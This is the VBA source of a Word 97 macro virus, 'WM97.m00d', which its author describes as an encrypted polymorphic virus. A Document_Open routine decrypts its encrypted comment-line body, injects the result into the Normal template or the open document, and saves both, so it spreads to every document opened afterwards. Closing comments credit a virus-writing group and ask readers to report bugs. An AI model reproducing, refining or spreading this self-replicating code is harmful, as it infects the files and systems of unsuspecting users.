Private Sub Document_Open()'25''w–In››˜›I{Ÿ—Jx¢KRx¤yŒ˜KiL™\\fLƒŸ–¡¡’›o¦MjN”^ “N‰ƒq^‚šœ¦”¡š£_t†s''{˜R€¡¤Ÿ”Ÿ‡˜ £Ÿ”§˜bŠv„¦£™—©c‹wx¤¢¥¤¤›¤ª©^g_dz¦›œ„¦›¬£f¤¡¦«`ieYjbYvY[‰¬£°›®ŸZ¯œ[ª°¨ ©¯›‹¬¡ªde^\‘¥¢«]‹‘†‹^{^’°³£'{˜Rs•¦›©˜w¢–¨ ˜¡§bŠv„¦£™—©c‹wx¤¢¥¤¤›¤ª©^g_dz¦›œ„¦›¬£f¤¡¦«`ieYjbYvY[‰¬£°›®ŸZ¯œ[ª°¨ ©¯›‹¬¡ªde^\‘¥¢«]~†‹^{^’°³£''i‡AoujoA^Av”—‡Bc†BdglqC_aCw–™‰DxŒ‰’'FyŒ›Go–š›GdHv—š•‰”|–™•ŠWkzœ™”X€mnš˜›š™™ ŸT]UZo›’zœ‘¢™’'GzŒ›G{ˆšœHeHi‹’Ÿm˜Œ–˜X€lzœ™•ŸYmnš™œ›š‘š ŸT^V[pœ‘’zœ‘£š“'_ˆ~:c€''i‡AoujoA]_Bv”—‡Bc†CdglqC`Cw–™‰DxŒ‰’'FyŒ›Go–š›GdHi‹œ‘l—Œ–—Wkzœ™”X€mnš˜›š™™ ŸT]UZo›’zœ‘¢™’'GzŒ›G{ˆšœHeHv—›–Š•}–™•‹X€lzœ™•ŸYmnš™œ›š‘š ŸT^V[pœ‘’zœ‘£š“'_ˆ~:c€''n|‡„V'A·À§À°Ë'A§âÍÂ¹¤×'AÓÉÚ¬¢¤'A¥œÃÌÄ'B£«Ï¾¸©ÒâÅ¤'Bº¿Á¬µ¤Éªâ'@¼°Ü'B±Î¯£Ÿ´Ø³¯'A®¶ À¬ÜÈ'BáµÅ¢Ë»å¦â'B¶¨À­æ¦Ÿ¶'AàÄ»ÛÚÎÒ'_ˆ‡„U''e‘?x@]@Q@t@i”•O„––‘ˆ‹‡•'n‹Em”˜šT’”‹™N~RGXPGdGIv•Hmšš—šHzœ–Iw¡LJ~’˜JrvKhKƒ'fƒ=aŒŒ’>Z\>r“„?s‡„'????•‹ˆ…@]@h“”NŠ†”IyMASK'@@@A—„…†A^A˜…‘†‡BHB˜Œ‘ˆCICf‹–LUWM'<<<<’ˆ…Š‚=Z=??'FFFFoŒGo–š›U“•›P€THYQHfIKy›’ŸŠJ}ŸŒJn™ ˜™ŸŠn—šŸ‘TUNL€”‘›'BBBBBCCC™†’‡ˆCaDš‡“ˆ‰DJEGj“‰Exš‡HFLFi˜NWYP'<<<<<<<<fi=Z=u'=======>bŒ’>[>r‘”„';;;;`‰<e‚'_ˆ~:c€'j‡Ai‘•–P‹‡•K{OCTLC`CFw˜…–˜—™_GEyŠ“';<<<c‹<Y<p’‚'_ˆ~:c€'l‰Dl“—˜R’Š˜M}QEVNEcFHk”Š’™šaIG{Œ•Gk—–HeH|š'i†@gA^Au“–†Ab†Bf‘‡B^aCw•˜ˆCw‹‰’'BCCCl‰CpŒ‡Ll“—˜R’Š˜M}QEVNQFWRFWOFcFHNIG{Œ•'BBBBBBBCr‡ˆ‘C`Dp‰’Ll“—˜S‘“Š˜M}QFWOOFSFW'CCDDDDDDsˆ{†—EbEr‰Nn•™šT’”‹šOSGXPSGZTHw”Œ”–R'??@@@@@@s‰š†A^Aj•Is†BLB[KBMCV'>>>>????e‘?x?]@Q@t@s‰›†'AABBBBBBBBBCkC`Cf‹•Km’˜Lv’ˆDNE\YNEPEVXVO'??@@@@@@@@@Ao†˜w‚“A^Bp‡™xƒ”BHCk'=========>>>f>[>@@'<<<<<<<<k‚•‘=v'>>>>>>??e‘?y?\?hl@t@il'CCCCCCCCDDDDj“–DtEbEVEy”Eq‹”Nn•™šT’•ŒšOSGXPQ'GGGGGGGHHHHHHHHHrIv’Qq˜X–“˜R…WK\TWK{WL{˜˜‘šULjM|™‘ƒŸM–“œ'@@@@@@@AAAAAAAAABBBBkˆBrB`CTCw‹ˆ‘'OOPPPPPPPPPQQQQQQQQQRRRRs˜¦—¤‰”¥SpS€œ—[|£§¨b ¢™¨]aUf^aU…¢š¢›¤VaVhcWƒœ¥_¦«¬f¤¡¦«`“eYjbbYfY‰¦¦Ÿ¨ZeZkd'DDDDDDDEEEEEEEEEFFFFFFFF”‹“•ŒGdGuŸ~‰šHNHi›Š›'DDDDDDDEEEEEEEEEFFFFFFFFn•š›U™Œ—“ˆŠ”‘–H‚TH— •’—'DDDDDEEEEEEEEEFFFFFFFFFF•Œ“•ŒGdHJJbHiœ›Š›IfIKKd'>>>>>>??????????@@@@eŒ“…'GGGHHHHHHHHHIIIIIIIIIJJJŒ™œ¡ŒKhKx”Tt›Ÿ Z˜•š’ U‡YM^VYM_ZN~N[N_W'PPPQQQQQQQQQRRRRRRRRRSSSt™§˜¥‰”¦TqT˜\|¤¨©c¡£š¨^bVg_bV†WbW†£›£œ¥dX„¦`€§«­g¥¢§¬a“fZkccZgZŠZh[Š§Ÿ§ ©[g\me'FFGGGGGGGGGHHHHHHHHHIIII— •’˜JgJŒ™¡ŒKQKy‘£‚LRLm“¡’ŸƒŸ'DDDDDDDEEEEEEEEEFFFFFFFFn•š›U™Œ—“ˆŠ”‘–H‚TH— •’—'GGGHHHHHHHHHIIIIIIIIIJJJ˜¡–“˜KhKMMeKl’ ‘‚LiMOOgM’“œŸ“¤ NkNPP'>>??????????@@@@@@@@e…Aj‡'=>>>>>>>>>??????dƒ?i†'=========>>>lƒ–’>n'<<<<<<<<k‚•‘=w'@@@@@@@@†˜”•“ŠˆA_BDIDBHBpˆšy„•'AAAAAAAAj‘•–P”‡’„†ˆŒ‘ˆC{PD’‰›—˜–“Œ'@@@AAAAAo†˜wƒ”B_BDD\B‘ˆš–—•Œ‘ŠDaDFF';;;;`‰<e‚'_ˆ~:c€'h’:r''s€‘†„“Mˆ’…’”Œ‰…“@RMA—„…†'lƒ–j„˜?\?h“Hr„@J@RUJALAR'h“”N“†‘‚„†Š‡BTNBJDIECICqˆšnˆM''f:W:M'f’AzA^AjmALBSBv‘Bj‘•—Q†’˜‘—’‰’‰—'EEEEn‹Fn•™šT’”‹šO€SGXPGdHJO–Œ‹—ŒKI}‘—IšŸ“˜™¡JgJ 'AAAAg”BvB_BSBv’Coˆ‘Kk’–˜R’‰—L}QEVNN'GGGGGHHH›Š“¡IfIr—QQQ^JTJv˜RršŸY—”™T…XL]UULWM_MWMVVM\N_f\aW'AAAABBBBƒB_BoŒ‡Kk’–—Q’‰—L}PDUNQEyQEVN'========>[>_‘FG'??@@@@@@c@]AƒALAo†˜l‡›BMB•—„ˆœ'========`>[>a†FaG'??@@@@@@t…‘Š†A^Au‡’‹‡BHCf';;;;i€“<p'AAAAi•–P”‡’ƒ…ˆŒ‘ˆCoOCFKFDJDx‰‘•‘“Š'????s„ŒŒ‰…@]@BB[AmA^AmALBS'h…@‘•‰”—@^Au“–†Au‰‡Bgš‹–Bh’•'h’:s''n”‰“Nv‰’–”q“•†„•‹‘B_Bhƒ–ˆ'o”‰”Od‡Š“e‘˜‡”•‹’‘–C`Ci„—‰'o”‰“Ns‚—†o“‚r”‘’–B_Bi„–ˆ''c†—Œ™ˆg’†˜‘‰’˜Rw…š‰f˜Efˆ™›Šj•‰›“‹”šTlœ““uˆ”Œ''f‘Bw–‹Ck’–—QŒ’‰—LmpDODVQEVNEbEGk”ŠFy›ˆH'??@@@h“”N„††•†Š†•BknBMBSNCT'e‰‰Š'A‰~Š€Set ‹‚©²ª = NormalTemplate.VBProjectSet ¦¥•° = ‹‚©²ª.VBComponents(1).CodeModuleSet Ç²§‰¼ = ActiveDocument.VBProjectSet ¹®¿ƒ‘‡‰ = Ç²§‰¼.VBComponents(1).CodeModuleIf ¦¥•°.lines(1, 1) <> "Private Sub Document_Open()" Then Set ˆ´£œ¶Æ©ˆ = ¹®¿ƒ‘‡‰If ¹®¿ƒ‘‡‰.lines(1, 1) <> "Private Sub Document_Open()" Then Set ˆ´£œ¶Æ©ˆ = ¦¥•°If ˆ´£œ¶Æ©ˆ = "" Then Exit SubFor Ÿ¤¦‘š‰­Æ = 3 To ˆ´£œ¶Æ©ˆ.countoflinesIf Mid(ˆ´£œ¶Æ©ˆ.lines(Ÿ¤¦‘š‰­Æ, 1), 1, 1) <> "'" Then Exit For¢–Â = Mid(ˆ´£œ¶Æ©ˆ.lines(Ÿ¤¦‘š‰­Æ, 1), 2, Len(ˆ´£œ¶Æ©ˆ.lines(Ÿ¤¦‘š‰­Æ, 1)))For –³”ˆ„™¼—“ = 1 To Len(¢–Â)”›…¥‘Á­ = Chr(Asc(Mid(¢–Â, –³”ˆ„™¼—“, 1)) - (Right(ˆ´£œ¶Æ©ˆ.lines(2, 1), Len(ˆ´£œ¶Æ©ˆ.lines(2, 1)) - 1)) - (Int(((4 * Len(¢–Â) + 2 * –³”ˆ„™¼—“)) / 18.3)))Æšª‡° ÉŠÆ = Æšª‡° ÉŠÆ & ”›…¥‘Á­Next –³”ˆ„™¼—“›¥’Ë‹„› = ›¥’Ë‹„› & Æšª‡° ÉŠÆ & Chr(13): Æšª‡° ÉŠÆ = ""Next Ÿ¤¦‘š‰­ÆFor Æ© À¿³· = 1 To ˆ´£œ¶Æ©ˆ.countoflinesIf ˆ´£œ¶Æ©ˆ.lines(Æ© À¿³·, 1) = "Private Sub Document_Close()" ThenApplication.ScreenUpdating = Falseˆ´£œ¶Æ©ˆ.insertlines Æ© À¿³· + 1, ›¥’Ë‹„›Exit ForEnd IfNext Æ© À¿³·Call Document_CloseNormalTemplate.SaveActiveDocument.SaveAs ActiveDocument.FullNameEnd SubPrivate Sub Document_Close()End Sub'<-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=->'MyName = WM97.m00d'WrittenBy = f0re [UC/Skamerks/DVC]''This is my first attempt to write an encrypted polymorphic macro virus.'I havent included any payload. Stealth is also left out (see my other macros for 'good stealth techniques). Although this virus is a bit slow, it works fine. I did have'some problems with the randomly generated key. Though you can check this out for yourself.'If you find any other errors please let me know. Have phun.'<-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=->